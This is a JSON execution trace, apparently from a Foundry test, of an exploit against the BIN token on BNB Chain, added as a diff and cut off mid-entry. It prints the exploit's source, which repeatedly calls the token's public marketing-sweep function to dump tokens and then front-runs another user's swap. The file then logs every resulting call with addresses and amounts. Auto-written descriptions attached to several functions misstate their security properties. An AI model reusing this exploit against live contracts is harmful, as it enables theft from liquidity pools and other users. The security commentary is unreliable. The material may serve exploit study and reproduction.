@@ -1,0 +1,2270 @@
+{
+  "logs": {
+    "calls": [
+      {
+        "id": "1804904",
+        "contract": "ContractTest",
+        "function": "testExploit",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        WBNB.approve(address(Router), type(uint256).max);\n        BIN.approve(address(Router), type(uint256).max);\n        deal(address(WBNB), address(this), 1 ether);\n        deal(address(WBNB), address(otherUser), 10 ether);\n        emit log_named_decimal_uint(\"Attacker WBNB balance before attack:\", WBNB.balanceOf(address(this)), 18);\n        while (BIN.balanceOf(address(BIN)) > 1_000_000_000_000_000_000_000_000) {\n            BIN.sweepTokenForMarketing();\n        }\n        WBNBTOTOKEN();\n\n        // Wait for other users to buy in\n        vm.startPrank(address(otherUser));\n        WBNB.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(BIN);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            WBNB.balanceOf(address(otherUser)), 0, path, address(otherUser), block.timestamp\n        );\n        vm.stopPrank();\n\n        TOKENTOWBNB();\n        emit log_named_decimal_uint(\"Attacker WBNB balance before attack:\", WBNB.balanceOf(address(this)), 18);\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `testExploit` function is designed to simulate an attack scenario involving two tokens, WBNB and BIN. It first approves the maximum possible allowance for a router contract to handle these tokens. Then, it manipulates the balances of WBNB for the attacker and another user. The function repeatedly calls `sweepTokenForMarketing` to reduce the BIN token balance in a specific contract until it reaches a certain threshold. After this, it triggers a token swap for another user and finally converts tokens back to WBNB. The function logs the attacker's WBNB balance before and after the attack.\n\n2. **Security mechanism**:  \n   - The function uses `approve` to grant the router contract the maximum allowance for WBNB and BIN tokens, ensuring the router can perform transactions on behalf of the caller.  \n   - The `deal` function is used to manipulate token balances, which is likely part of a testing framework to simulate specific conditions.  \n   - The `vm.startPrank` and `vm.stopPrank` functions simulate actions from another user's address, isolating the attacker's actions from the other user's actions.  \n   - The `swapExactTokensForTokensSupportingFeeOnTransferTokens` function is used to perform a token swap while accounting for transfer fees.  \n\n3. **Parameter Function**:  \n   - `WBNB.approve(address(Router), type(uint256).max)`: Grants the router contract the maximum allowance to spend WBNB tokens.  \n   - `BIN.approve(address(Router), type(uint256).max)`: Grants the router contract the maximum allowance to spend BIN tokens.  \n   - `deal(address(WBNB), address(this), 1 ether)`: Sets the WBNB balance of the attacker's address to 1 ether.  \n   - `deal(address(WBNB), address(otherUser), 10 ether)`: Sets the WBNB balance of another user's address to 10 ether.  \n   - `Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(...)`: Performs a token swap for the other user, using their entire WBNB balance.  \n\n4. **Return description**:  \n   The function does not return any value. Instead, it logs the attacker's WBNB balance before and after the attack using `emit log_named_decimal_uint`. The balance is displayed in a human-readable format with 18 decimal places, showing the changes in the attacker's WBNB holdings as a result of the simulated attack.  \n\n**In summary**,  \nThe `testExploit` function simulates an attack scenario involving token manipulation and swaps. It uses approval mechanisms, balance manipulation, and token swaps to test or demonstrate an exploit. The function logs the attacker's WBNB balance before and after the attack to show the impact of the simulated actions.",
+        "return_value": "Returned",
+        "depth": 0,
+        "internal_calls": [
+          {
+            "id": "24420",
+            "contract": "WBNB",
+            "function": "approve",
+            "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+            "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n",
+            "description": "1. **Core functions**:  \n   The `approve` function is used to allow another address (called the `spender`) to spend a specific amount of tokens on behalf of the person calling the function (the owner). This is a common feature in token contracts, enabling delegated spending without transferring ownership of the tokens.\n\n2. **Security mechanism**:  \n   - The function is marked as `public`, meaning it can be called by anyone.  \n   - It uses `virtual override`, allowing it to be customized or extended in derived contracts.  \n   - The `_approve` internal function is called to handle the actual approval logic, ensuring consistency and reducing the risk of errors.  \n\n3. **Parameter Function**:  \n   - `spender`: This is the address of the account that is being granted permission to spend tokens.  \n   - `amount`: This specifies the maximum number of tokens the `spender` is allowed to use.  \n\n4. **Return description**:  \n   The function always returns `true` to indicate that the approval process was successful. This is a standard practice to confirm the operation completed as expected.  \n\n**In summary**, the `approve` function allows a token owner to delegate spending rights to another address, ensuring the process is secure and straightforward by returning a confirmation of success.",
+            "return_value": "true",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "24586",
+            "contract": "BIN",
+            "function": "approve",
+            "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+            "flag": 1,
+            "return_value": "true",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "2534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+            "description": "1. Core functions:  \nThe `balanceOf` function is designed to check and return the balance of a specific account. It looks up the balance associated with the given account address and provides this information to the caller. This is a fundamental function in many token contracts, allowing users or other contracts to query how many tokens a particular account holds.\n\n2. Security mechanism:  \nThe function includes the `view` modifier, which ensures that it does not modify the state of the contract (it only reads data). The `public` modifier allows the function to be called by anyone, ensuring transparency and accessibility. Additionally, the `virtual override` keywords indicate that this function can be overridden by derived contracts, providing flexibility for customization while maintaining the core functionality.\n\n3. Parameter Function:  \nThe function takes one parameter, `account`, which is an address. This address represents the account whose token balance is being queried. The function uses this address to look up the corresponding balance in the `_balances` mapping.\n\n4. Return description:  \nThe function returns a `uint256` value, which represents the token balance of the specified account. It retrieves this value directly from the `_balances` mapping, where the account address is used as the key to find the associated balance.\n\nIn summary,  \nThe `balanceOf` function is a simple yet essential tool for checking the token balance of a specific account. It is secure, transparent, and easy to use, ensuring that anyone can query account balances without altering the contract's state.",
+            "return_value": "0",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "record",
+            "args": "",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "0",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "accesses",
+            "args": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]",
+            "return_value": "[0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c], []",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "load",
+            "args": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c",
+            "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "load",
+            "args": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c",
+            "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "0",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "store",
+            "args": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "store",
+            "args": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0x0000000000000000000000000000000000000000000000000000000000000000",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "load",
+            "args": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c",
+            "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "store",
+            "args": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c, 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "1000000000000000000 [1e18]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "2534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4",
+            "flag": 1,
+            "return_value": "0",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "record",
+            "args": "",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4",
+            "flag": 1,
+            "return_value": "0",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "accesses",
+            "args": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]",
+            "return_value": "[0x2d95b34855a4692fd417388e3bb320333be94a2975ac18612e27cb3c748cc690], []",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "load",
+            "args": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x2d95b34855a4692fd417388e3bb320333be94a2975ac18612e27cb3c748cc690",
+            "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "load",
+            "args": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x2d95b34855a4692fd417388e3bb320333be94a2975ac18612e27cb3c748cc690",
+            "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4",
+            "flag": 1,
+            "return_value": "0",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "store",
+            "args": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x2d95b34855a4692fd417388e3bb320333be94a2975ac18612e27cb3c748cc690, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4",
+            "flag": 1,
+            "return_value": "115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "store",
+            "args": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x2d95b34855a4692fd417388e3bb320333be94a2975ac18612e27cb3c748cc690, 0x0000000000000000000000000000000000000000000000000000000000000000",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "load",
+            "args": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x2d95b34855a4692fd417388e3bb320333be94a2975ac18612e27cb3c748cc690",
+            "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "0",
+            "contract": "VM",
+            "function": "store",
+            "args": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x2d95b34855a4692fd417388e3bb320333be94a2975ac18612e27cb3c748cc690, 0x0000000000000000000000000000000000000000000000008ac7230489e80000",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "0xAb7BF20f8Ebbb286644b2C57ea448F27ef0598d4",
+            "flag": 1,
+            "return_value": "10000000000000000000 [1e19]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "534",
+            "contract": "WBNB",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "1000000000000000000 [1e18]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "2532",
+            "contract": "BIN",
+            "function": "balanceOf",
+            "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]",
+            "flag": 1,
+            "return_value": "12048305953898063254994587 [1.204e25]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "138085",
+            "contract": "BIN",
+            "function": "sweepTokenForMarketing",
+            "args": "",
+            "original_code": "    function sweepTokenForMarketing() public nonReentrant {\n        uint256 contractTokenBalance = balanceOf(address(this));\n        if (contractTokenBalance >= tokenForMarketing) {\n            swapTokensForEth(tokenForMarketing);\n        }\n    }\n\n    // receive eth from uniswap swap\n    receive() external payable {}\n\n",
+            "description": "1. **Core functions:**  \n   The main purpose of this Solidity function, `sweepTokenForMarketing`, is to check the balance of tokens held by the contract and, if the balance meets or exceeds a specific threshold (`tokenForMarketing`), it swaps those tokens for Ethereum (ETH). This function is likely part of a system designed to manage funds for marketing purposes, converting tokens into ETH to be used for marketing activities.\n\n2. **Security mechanism:**  \n   The function includes the `nonReentrant` modifier, which prevents reentrancy attacks. Reentrancy attacks occur when an external call is made before the function completes, allowing an attacker to repeatedly call the function and drain funds. The `nonReentrant` modifier ensures that the function cannot be called again until the current execution is finished, adding a layer of security.\n\n3. **Parameter Function:**  \n   This function does not take any parameters. It relies on the contract's internal state, specifically the `tokenForMarketing` variable, which represents the threshold amount of tokens required to trigger the swap. The function also uses `balanceOf(address(this))` to check the current token balance of the contract itself.\n\n4. **Return description:**  \n   The function does not return any value. Instead, it performs an action: if the contract's token balance is greater than or equal to the `tokenForMarketing` threshold, it calls another function, `swapTokensForEth`, to convert the specified amount of tokens into ETH. The `receive()` function allows the contract to accept ETH payments, which is likely used to receive ETH from the swap operation.\n\n**In summary,**  \nThis function is designed to manage marketing funds by converting tokens into ETH when a certain threshold is met. It includes a security measure (`nonReentrant`) to prevent reentrancy attacks, relies on internal state variables for its logic, and does not return any value but instead performs a swap operation. The `receive()` function enables the contract to accept ETH payments.",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "275",
+                "contract": "Router",
+                "function": "WETH",
+                "args": "",
+                "return_value": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "121732",
+                "contract": "Router",
+                "function": "swapExactTokensForETHSupportingFeeOnTransferTokens",
+                "args": "1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9]",
+                "return_value": "Returned",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "25023",
+                    "contract": "BIN",
+                    "function": "transferFrom",
+                    "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24]",
+                    "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool);\n\n",
+                    "description": "1. **Core functions:**  \nThe `transferFrom` function is designed to move a specific amount of tokens (represented by `value`) from one address (`from`) to another address (`to`). This function is commonly used in token contracts to allow a third party (like an exchange or a smart contract) to transfer tokens on behalf of the token owner, provided the owner has approved the third party to do so.\n\n2. **Security mechanism:**  \nThe function is marked as `external`, meaning it can only be called from outside the contract, ensuring it cannot be invoked internally by other functions within the same contract. Additionally, the function typically includes checks to ensure that the `from` address has sufficient tokens and that the caller has been approved to transfer tokens on behalf of the `from` address. These checks help prevent unauthorized transfers and ensure the integrity of the token system.\n\n3. **Parameter Function:**  \n- `from`: This is the address from which the tokens will be transferred. It represents the owner of the tokens.  \n- `to`: This is the address that will receive the tokens. It represents the recipient.  \n- `value`: This is the amount of tokens to be transferred. It specifies the quantity of tokens moving from `from` to `to`.\n\n4. **Return description:**  \nThe function returns a boolean value (`true` or `false`) to indicate whether the transfer was successful. If the transfer is completed without issues, the function returns `true`. If there is a problem (e.g., insufficient balance or lack of approval), the function returns `false`.\n\nIn summary, the `transferFrom` function allows a third party to transfer tokens between two addresses, provided the necessary approvals are in place. It ensures security through external access restrictions and validation checks, and it returns a boolean to confirm the success or failure of the transfer.",
+                    "return_value": "true",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "2893",
+                    "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "function": "getReserves",
+                    "args": "",
+                    "return_value": "70400341474082036708 [7.04e19], 29652882184550549714540985 [2.965e25], 1710122977 [1.71e9]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "532",
+                    "contract": "BIN",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "30652882184550549714540985 [3.065e25]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "64340",
+                    "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "function": "swap",
+                    "args": "2291140782440021163 [2.291e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x",
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "29962",
+                        "contract": "WBNB",
+                        "function": "transfer",
+                        "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 2291140782440021163 [2.291e18]",
+                        "original_code": "    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n",
+                        "description": "1. **Core functions:**  \n   The `transfer` function is designed to move a specified amount of tokens from the sender's account to the recipient's account. It acts as a basic mechanism for transferring tokens within the system.\n\n2. **Security mechanism:**  \n   The function uses the `public` and `virtual` modifiers, allowing it to be called by anyone and overridden by derived contracts. The `override` modifier ensures it replaces any existing function with the same name in the parent contract. Additionally, it relies on the internal `_transfer` function, which likely includes checks to ensure valid transfers (e.g., sufficient balance, non-zero addresses).\n\n3. **Parameter Function:**  \n   - `recipient`: The address of the account that will receive the tokens.  \n   - `amount`: The number of tokens to be transferred from the sender to the recipient.  \n\n4. **Return description:**  \n   The function always returns `true` to indicate that the transfer was successful. This assumes that the internal `_transfer` function handles any errors or invalid conditions internally.  \n\nIn summary, the `transfer` function facilitates token transfers between accounts, ensures it can be overridden or extended, and confirms success by returning `true`.",
+                        "return_value": "true",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "534",
+                        "contract": "WBNB",
+                        "function": "balanceOf",
+                        "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                        "flag": 1,
+                        "return_value": "68109200691642015545 [6.81e19]",
+                        "depth": 4,
+                        "internal_calls": []
+                      },
+                      {
+                        "id": "532",
+                        "contract": "BIN",
+                        "function": "balanceOf",
+                        "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                        "flag": 1,
+                        "return_value": "30652882184550549714540985 [3.065e25]",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  },
+                  {
+                    "id": "534",
+                    "contract": "WBNB",
+                    "function": "balanceOf",
+                    "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]",
+                    "flag": 1,
+                    "return_value": "2291140782440021163 [2.291e18]",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "9223",
+                    "contract": "WBNB",
+                    "function": "withdraw",
+                    "args": "2291140782440021163 [2.291e18]",
+                    "original_code": "    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        msg.sender.transfer(wad);\n        Withdrawal(msg.sender, wad);\n    }\n\n",
+                    "description": "1. **Core function**:  \n   This function allows a user to withdraw a specific amount of tokens (referred to as `wad`) from their account. It checks if the user has enough tokens in their balance, deducts the amount from their balance, and then sends the tokens to the user's address. Additionally, it logs an event called `Withdrawal` to record the transaction.\n\n2. **Security mechanism**:  \n   - `require(balanceOf[msg.sender] >= wad)`: Ensures the user has enough tokens to withdraw. If not, the transaction is stopped.  \n   - `balanceOf[msg.sender] -= wad`: Safely reduces the user's balance after confirming they have sufficient funds.  \n   - `msg.sender.transfer(wad)`: Sends the tokens to the user's address securely.  \n   - The function is marked as `public`, meaning it can be called by anyone, but the `require` statement ensures only valid withdrawals are processed.\n\n3. **Parameter Function**:  \n   - `uint wad`: This parameter represents the amount of tokens the user wants to withdraw. It must be a non-negative integer and cannot exceed the user's current balance.\n\n4. **Return description**:  \n   This function does not return any value. Instead, it performs actions: it updates the user's balance, transfers the tokens, and emits an event to record the withdrawal.\n\n**In summary**, this function enables users to withdraw tokens securely by checking their balance, deducting the amount, and transferring the tokens while logging the transaction.",
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "id": "532",
+        "contract": "BIN",
+        "function": "balanceOf",
+        "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]",
+        "flag": 1,
+        "return_value": "11048305953898063254994587 [1.104e25]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "76101",
+        "contract": "BIN",
+        "function": "sweepTokenForMarketing",
+        "args": "",
+        "flag": 1,
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "275",
+            "contract": "Router",
+            "function": "WETH",
+            "args": "",
+            "return_value": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "70248",
+            "contract": "Router",
+            "function": "swapExactTokensForETHSupportingFeeOnTransferTokens",
+            "args": "1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9]",
+            "return_value": "Returned",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "6623",
+                "contract": "BIN",
+                "function": "transferFrom",
+                "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "893",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "getReserves",
+                "args": "",
+                "return_value": "68109200691642015545 [6.81e19], 30652882184550549714540985 [3.065e25], 1710126485 [1.71e9]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "532",
+                "contract": "BIN",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "31652882184550549714540985 [3.165e25]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "38256",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "swap",
+                "args": "2146543675010528950 [2.146e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x",
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": [
+                  {
+                    "id": "23162",
+                    "contract": "WBNB",
+                    "function": "transfer",
+                    "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 2146543675010528950 [2.146e18]",
+                    "flag": 1,
+                    "return_value": "true",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "534",
+                    "contract": "WBNB",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "65962657016631486595 [6.596e19]",
+                    "depth": 4,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "532",
+                    "contract": "BIN",
+                    "function": "balanceOf",
+                    "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                    "flag": 1,
+                    "return_value": "31652882184550549714540985 [3.165e25]",
+                    "depth": 4,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "534",
+                "contract": "WBNB",
+                "function": "balanceOf",
+                "args": "Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E]",
+                "flag": 1,
+                "return_value": "2146543675010528950 [2.146e18]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "9223",
+                "contract": "WBNB",
+                "function": "withdraw",
+                "args": "2146543675010528950 [2.146e18]",
+                "flag": 1,
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": []
+              }
+            ],
+            "value": null
+          }
+        ]
+      },
+      {
+        "id": "532",
+        "contract": "BIN",
+        "function": "balanceOf",
+        "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371]",
+        "flag": 1,
+        "return_value": "10048305953898063254994587 [1.004e25]",
+        "depth": 1,
+        "internal_calls": []
+      },
+      {
+        "id": "76101",
+        "contract": "BIN",
+        "function": "sweepTokenForMarketing",
+        "args": "",
+        "flag": 1,
+        "return_value": "Returned",
+        "depth": 1,
+        "internal_calls": [
+          {
+            "id": "275",
+            "contract": "Router",
+            "function": "WETH",
+            "args": "",
+            "return_value": "WBNB: [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c]",
+            "depth": 2,
+            "internal_calls": [],
+            "value": null
+          },
+          {
+            "id": "70248",
+            "contract": "Router",
+            "function": "swapExactTokensForETHSupportingFeeOnTransferTokens",
+            "args": "1000000000000000000000000 [1e24], 0, [0xe56842Ed550Ff2794F010738554db45E60730371, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], 0x621f589e3CBb8e710241DDfbc2b291cDBf69b453, 1710126485 [1.71e9]",
+            "return_value": "Returned",
+            "depth": 2,
+            "internal_calls": [
+              {
+                "id": "6623",
+                "contract": "BIN",
+                "function": "transferFrom",
+                "args": "BIN: [0xe56842Ed550Ff2794F010738554db45E60730371], 0xe432afB7283A08Be24E9038C30CA6336A7cC8218, 1000000000000000000000000 [1e24]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "893",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "getReserves",
+                "args": "",
+                "return_value": "65962657016631486595 [6.596e19], 31652882184550549714540985 [3.165e25], 1710126485 [1.71e9]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "532",
+                "contract": "BIN",
+                "function": "balanceOf",
+                "args": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "flag": 1,
+                "return_value": "32652882184550549714540985 [3.265e25]",
+                "depth": 3,
+                "internal_calls": []
+              },
+              {
+                "id": "38256",
+                "contract": "0xe432afB7283A08Be24E9038C30CA6336A7cC8218",
+                "function": "swap",
+                "args": "2015221445255362781 [2.015e18], 0, Router: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 0x",
+                "return_value": "Returned",
+                "depth": 3,
+                "internal_calls": [
+                  {
+                    "id": "23162",
+                    "contract": "WBNB",
+                    "function": "transfer",
